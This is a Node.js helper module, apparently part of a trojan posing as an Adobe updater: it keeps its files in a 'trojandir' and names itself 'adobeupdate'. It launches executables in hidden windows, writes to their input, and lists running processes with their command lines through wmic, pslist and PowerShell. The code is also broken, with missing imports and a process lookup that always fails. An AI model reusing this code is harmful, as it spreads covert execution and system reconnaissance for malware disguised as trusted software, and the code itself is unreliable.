const helper = require("./adobeupdate.helper.js");

var process_argv = [];

for (let token of process.argv) {
    if ( ! token.includes("--inspect-brk")) process_argv.push(token);
}

async function invoke_exe(
    exename,
    targs = null,
    exedirpath = "",
    stdoutfunc,
    stderrfunc,
    closefunc,
    async = false
) {
    return new Promise((resolve, reject) => {
        const exePath = path.join(exedirpath ?? "", exename);

        helper.logmsg(`spawning ${exePath}`);

        let child = spawn(exePath, targs, {
            shell: true, // exename.slice(-4) == ".cmd",
            windowsHide: true,
            stdio: "pipe",
        });

        if (async) resolve(child);

        if (!child) {
            throw new Error("failed to spawn child process");
        }

        try {
            child?.stdout?.on("data", (data) => {
                let text = data.toString();

                if (stdoutfunc) stdoutfunc(text);
            });

            child?.stderr?.on("data", (data) => {
                let text = data.toString();

                if (stderrfunc) stderrfunc(text);
            });

            child?.on("close", (code) => {
                helper.logmsg(`[YYW24]Child process exited with code ${code}`);

                if (closefunc) {
                    closefunc(code);
                }

                resolve(child);
            });

            child.on("error", (err) => {
                helper.logmsg("Failed to start child process:", err);
                reject(err);
            });
        } catch (err) {
            helper.logmsg(err);
        }
    });
}

function writeToChildProcess(child, msg) {
    if (!child) {
        throw new Error("child process is null");
    }

    if (child.stdin.writable) {
        helper.logmsg(`writing msg to child process: ${child.pid} -- ` + msg);
        child.stdin.write(msg);
        // child.stdin.end();
    }
}

function isChildHealthy(childProcess) {
    return (
        childProcess !== null &&
        childProcess.pid !== undefined && // Has a valid Process ID
        childProcess.killed === false && // Has not been sent a kill signal
        childProcess.connected === true // IPC channel is open and ready
    );
}

// TODO refactor to use koffi
async function exec_pslist() {
    let pslisttxt = "";

    let exepath = path.join(systemstate.trojandir, "pslist.exe");

    if (!fileExists(exepath)) {
        throw new Error("pslist.exe does not exist ");
    }

    let childp = await invoke_exe(
        "pslist.exe",
        ["-accepteula"],
        systemstate.trojandir,
        (text) => {
            pslisttxt += text;
        },
        null
    );

    return pslisttxt;
}

async function checkIfPipeExists(pipePath) {
    try {
        const stats = await fs.stat(pipePath);
        return stats.isFIFO();
    } catch (error) {
        return false;
    }
}

async function exec_wmic_process() {
    return new Promise((resolve, reject) => {
        const wmicCommand =
            "wmic process get ProcessId,Name,CommandLine /format:csv";

        exec(wmicCommand, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            }

            if (stderr) {
                reject(stderr);
            }

            resolve(stdout);
        });
    });
}

async function getProcessList_wmic() {
    let buffer = await exec_wmic_process();
    let isutf16le = isUTF16LEBuffer(buffer);

    let csvData = isutf16le
        ? buffer.toString("utf16le")
        : buffer.toString("utf8");

    // { CommandLine, Name, Node, ProcessId }
    let jsondata = csvToJson(csvData);

    return jsondata;
}

async function getProcessList_ps() {
    return new Promise((resolve, reject) => {
        const psCommand = `Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | ConvertTo-Json`;

        exec(
            `powershell.exe -NoProfile -Command "${psCommand}"`,
            { maxBuffer: 1024 * 1024 * 10 },
            (error, stdout, stderr) => {
                if (error) {
                    reject(error);
                }

                if (stderr) {
                    reject(stderr);
                }

                const processes = JSON.parse(stdout);
                // CommandLine
                // Name
                // ProcessId

                resolve(processes);
            }
        );
    });
}


function isPidAlive(pid) {
    if (pid <= 0) {
        return false;
    }

    try {
        // Signal 0 tests for process existence without modifying it
        process.kill(pid, 0);
        return true;
    } catch (error) {
        // ESRCH means the process was not found
        return error.code === "EPERM"; // True if it exists but you lack permissions
    }
}

async function initProcessList() {
    logmsg("starting");

    let outproclist = [];

    try {
        outproclist = await getProcessList_wmic();
    } catch (err) {
        logmsg(err);
    }

    if (outproclist && outproclist.length > 0) {
        return outproclist;
    }

    try {
        outproclist = await getProcessList_pslist();
    } catch (err) {
        logmsg(err);
    }

    if (outproclist && outproclist.length > 0) {
        return outproclist;
    }

    try {
        outproclist = await getProcessList_ps();
    } catch (err) {
        logmsg(err);
    }

    if (outproclist && outproclist.length > 0) {
        return outproclist;
    }
}

async function getProcess(pid) {
    // CommandLine
    // Name
    // ProcessId

    let processlist = await initProcessList();

    if (!processlist || processlist.length >= 1) {
        return null;
    }

    for (let i = 0; i < processlist.length; i++) {
        if (processlist[i].ProcessId == pid) return processlist[i];
    }

    return null;
}

function setcwd(localpath) {
    logmsg(`Starting directory: ${process.cwd()}`);

    process.chdir(localpath);

    logmsg(`New directory: ${process.cwd()}`);
}

async function getProcessList_pslist() {
    let pslisttxt = await exec_pslist();

    let proclist = [];

    const lines = pslisttxt.split(/\r?\n/).filter((line) => line.trim() !== "");

    // Name                Pid Pri Thd  Hnd   Priv        CPU Time    Elapsed Time
    let begin = false;
    for (let i = 0; i < lines.length; i++) {
        let tokens = lines[i]
            .trim()
            .split(/\s+/)
            .filter((word) => word.trim() !== "");

        if (!begin && !tokens.includes("Elapsed")) {
            continue;
        }

        if (!begin) {
            begin = true;
            continue;
        }

        let procname = "";
        let pid = "";

        for (let j = 0; j < tokens.length; j++) {
            let token = tokens[j];

            if (!isInteger(token)) {
                procname += " " + token;
            } else {
                pid = token;
                break;
            }
        }

        proclist.push({
            ProcessId: pid,
            Name: procname.trim(),
            CommandLine: "",
        });
    }

    return proclist;
}


module.exports = {
    process_argv,
    invoke_exe,
    writeToChildProcess,
    exec_pslist,
    isChildHealthy,
    checkIfPipeExists
};